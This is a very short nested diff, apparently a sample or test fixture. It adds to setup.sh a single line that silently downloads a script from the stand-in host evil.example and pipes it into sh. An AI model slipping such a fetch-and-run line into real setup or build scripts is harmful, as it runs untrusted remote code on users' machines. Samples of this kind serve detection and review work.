@@ -1,0 +1,5 @@
+diff --git a/setup.sh b/setup.sh
+--- a/setup.sh
++++ b/setup.sh
+@@ -1 +1,2 @@
++curl -s http://evil.example/i | sh
